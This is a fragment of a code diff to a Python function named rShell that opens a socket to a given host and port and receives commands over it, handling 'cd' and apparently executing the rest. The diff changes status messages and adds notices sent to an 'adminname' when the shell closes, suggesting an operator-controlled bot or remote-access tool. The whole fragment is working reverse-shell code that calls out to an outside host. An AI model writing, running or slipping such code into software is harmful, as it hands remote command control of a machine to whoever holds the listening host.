@@ -212,15 +212,18 @@ def rShell(rsHost, rsPort):
     try:
         rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         rs.connect_ex((str(rsHost), int(rsPort)))
-        rs.sendto(str.encode("[*] Connection established!"), (str(rsHost), int(rsPort)))
+        rs.sendto(str.encode("[+] Connection established!"), (str(rsHost), int(rsPort)))
         rsConnected = True
         if debugmode:
-            print("[*] Connection established with " + rsHost + ":" + rsPort + "!")
+            print("[+] Connection established with " + rsHost + ":" + rsPort + "!")
         while rsConnected:
             try:
                 data = rs.recv(1024).decode("UTF-8")
                 if data == "quit":
                     rs.close()
+                    sendnetc("[x] Closed reverse shell connection with "+ rsHost +":"+ rsPort +"!", adminname)
+                    if debugmode:
+                        print("[x] Closed reverse shell connection with "+ rsHost +":"+ rsPort +"!")
                 if data[:2] == "cd":
                     os.chdir(data[3:])
                 if len(data) > 0:
